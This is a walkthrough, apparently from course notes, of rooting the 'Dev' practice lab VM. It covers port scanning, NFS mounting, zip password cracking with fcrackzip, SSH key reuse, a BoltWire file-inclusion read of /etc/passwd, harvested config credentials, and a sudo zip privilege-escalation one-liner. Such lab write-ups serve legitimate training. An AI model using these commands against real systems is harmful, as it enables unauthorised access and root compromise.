# Dev

Start the machine and login using `root:tcm` . Next use `dhclient` then `ip a` to get the IP address.

Back to Kali..

Let’s start with an Nmap scan:

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -T4 -p- -A 10.0.2.155
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-18 07:32 EST
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Nmap scan report for 10.0.2.155
Host is up (0.00039s latency).
Not shown: 65526 closed tcp ports (conn-refused)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:96:ec:08:2f:b1:ea:06:ca:fc:46:8a:7e:8a:e3:55 (RSA)
|   256 56:32:3b:9f:48:2d:e0:7e:1b:df:20:f8:03:60:56:5e (ECDSA)
|_  256 95:dd:20:ee:6f:01:b6:e1:43:2e:3c:f4:38:03:5b:36 (ED25519)
80/tcp    open  http     Apache httpd 2.4.38 ((Debian))
|_http-title: Bolt - Installation error
|_http-server-header: Apache/2.4.38 (Debian)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      37992/udp   mountd
|   100005  1,2,3      38493/tcp   mountd
|   100005  1,2,3      44223/tcp6  mountd
|   100005  1,2,3      44802/udp6  mountd
|   100021  1,3,4      44655/tcp   nlockmgr
|   100021  1,3,4      46159/tcp6  nlockmgr
|   100021  1,3,4      49326/udp6  nlockmgr
|   100021  1,3,4      49353/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs      3-4 (RPC #100003)
8080/tcp  open  http     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
38493/tcp open  mountd   1-3 (RPC #100005)
43633/tcp open  mountd   1-3 (RPC #100005)
44655/tcp open  nlockmgr 1-4 (RPC #100021)
48669/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Interesting ports are `80` , `8080`, and `2049` which contains an NFS, a network file share. Let’s enumerate each one starting with port 80.

Go to the browser and enter `http://<MACHINE IP>:80` in the address bar.

![bolt_installation_error](https://github.com/w1zzl3-06/TCM-Practical-Ethical-Hacking-Notes/assets/141921425/7f1c0e77-7705-44cf-b00b-e01204c5a8e7)

Looks like we have an installation error. But now we know that we’re attacking a linux machine based on the current folder bolt is installed in `/var/www/html/`. Clicking on the documentation will reveal that Bolt is a CMS (content management system). 

For port 8080:

![php_info](https://github.com/w1zzl3-06/TCM-Practical-Ethical-Hacking-Notes/assets/141921425/0cebf748-7bd5-4301-b1e6-36dee5f5b6e7)

We have a php info page. This contains useful information such as the server path, webmaster and IP address just to name a few.  This page might lead to more information disclosure through exploitation.

Time to further enumerate these ports using `ffuf` on separate tabs:

`ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://<MACHINE IP>/FUZZ`

`ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://<MACHINE IP>:8080/FUZZ`

While those are running. Lets check out nfs:

```bash
┌──(kali㉿kali)-[~]
└─$ showmount -e 10.0.2.155
Export list for 10.0.2.155:
/srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16
                                                                                                                                                                                                                                                                                                                                         
┌──(kali㉿kali)-[~]
└─$ sudo mkdir /mnt/dev    
[sudo] password for kali:

┌──(kali㉿kali)-[~]
└─$ sudo mount -t nfs 10.0.2.155:/srv/nfs /mnt/dev/
                                                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ cd /mnt/dev/
                                                                                                                                                                                             
┌──(kali㉿kali)-[/mnt/dev]
└─$ ls
save.zip
                                                                                                                                                                                             
┌──(kali㉿kali)-[/mnt/dev]
└─$ unzip save.zip
Archive:  save.zip
[save.zip] id_rsa password: 
password incorrect--reenter: 
   skipping: id_rsa                  incorrect password
   skipping: todo.txt                incorrect password
```

We inspected the shares available using the `showmount`command. 

Next we created a directory `/mnt/dev` and saved our mount in there. 

The directory now contains a `save.zip` file. 

Trying to unzip requires a password. Which we do not have. On a side note, we can see the files inside the zip `id_rsa` and `todo.txt`.

Let’s try cracking the zip file using `fcrackzip`. Install it using `apt install fcrackzip`. Once that’s done:

```bash
┌──(kali㉿kali)-[/mnt/dev]
└─$ fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip
found file 'id_rsa', (size cp/uc   1435/  1876, flags 9, chk 2a0d)
found file 'todo.txt', (size cp/uc    138/   164, flags 9, chk 2aa1)

PASSWORD FOUND!!!!: pw == java101
```

Nice. A password `java101`.

```bash
┌──(kali㉿kali)-[/mnt/dev]
└─$ sudo unzip save.zip
Archive:  save.zip
[save.zip] id_rsa password: 
  inflating: id_rsa                  
  inflating: todo.txt                
                                                                                                                                                                                            
┌──(kali㉿kali)-[/mnt/dev]
└─$ ls
id_rsa  save.zip  todo.txt
                                                                                                                                                                                            
┌──(kali㉿kali)-[/mnt/dev]
└─$ cat todo.txt
- Figure out how to install the main website properly, the config file seems correct...
- Update development website
- Keep coding in Java because it's awesome

jp
```

The `id_rsa` file can be used to login into `ssh` and the todo.txt reveals what might be a user `jp`.

```bash
┌──(kali㉿kali)-[/mnt/dev]
└─$ ssh -i id_rsa jp@10.0.2.155                
The authenticity of host '10.0.2.155 (10.0.2.155)' can't be established.
ED25519 key fingerprint is SHA256:NHMY4yX3pvvY0+B19v9tKZ+FdH9JOewJJKnKy2B0tW8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.2.155' (ED25519) to the list of known hosts.
jp@10.0.2.155's password: 
Permission denied, please try again.
jp@10.0.2.155's password:
```

That did not work..

Back to the `ffuf` results from earlier.

From port 8080 there’s `/dev`. Accessing it from the browser reveals a Boltwire web application. 

![Boltwire](https://github.com/w1zzl3-06/TCM-Practical-Ethical-Hacking-Notes/assets/141921425/31e045b5-9c94-44e4-bdeb-f648eeaaaefb)

Let’s see if this webapp has any exploits. Thanks to Google, the app is susceptible to a [Local File Inclusion vulnerability](https://www.exploit-db.com/exploits/48411). 

We can also achieve the same result by using `searchsploit boltwire` in the terminal.

Basically, this exploit allows us to read the `etc/passwd` as an authenticated user. So all we need to do is go back to the boltwire page , create an account and reproduce the exploit as per the instructions and sure enough:

![Boltwire_passwd](https://github.com/w1zzl3-06/TCM-Practical-Ethical-Hacking-Notes/assets/141921425/8d0260a3-e788-4501-8a6e-2bf3e393f023)

Looks like we have a `jeanpaul` user with the `/home/jeanpaul` directory. This might possibly be the user `jp` that previously tried to ssh into. We have a user name now. Time to find a password.

From port 80, the directories discovered were `/public`, `/src`, `/app`, `/vendor`, and `/extensions`

The most useful directory is `/app` which contains a config.yml file with the following credentials:

```bash
# If you're trying out Bolt, just keep it set to SQLite for now.
database:
    driver: sqlite
    databasename: bolt
    username: bolt
    password: I_love_java
```

With a possible password in hand. Lets try to SSH into the machine like last time using the `id_rsa` file but this time with the user `jeanpaul` and the password `I_love_java`.

```bash
┌──(kali㉿kali)-[/mnt/dev]
└─$ ssh -i id_rsa jeanpaul@10.0.2.155              
Enter passphrase for key 'id_rsa': 
Linux dev 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jun  2 05:25:21 2021 from 192.168.10.31
jeanpaul@dev:~$ history
    1  echo "" > .bash_history 
    2  sudo -l
    3  exit
    4  history
jeanpaul@dev:~$ sudo -l
Matching Defaults entries for jeanpaul on dev:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jeanpaul may run the following commands on dev:
    (root) NOPASSWD: /usr/bin/zip
jeanpaul@dev:~$
```

It worked and it seems like the user can run the `zip` command as a privileged user. 

The best way to find how to exploit certain commands that run as root is by going to [GTFOBins](https://gtfobins.github.io/). 

Once there, use the searchbar to search for `zip` and under the sudo section. We should have the commands we need to run to get root:

```bash
jeanpaul@dev:~$ TF=$(mktemp -u)
jeanpaul@dev:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# whoami
root
# ls  
# cd /root
# ls
flag.txt
# cat flag.txt
Congratz on rooting this box !
```

😎
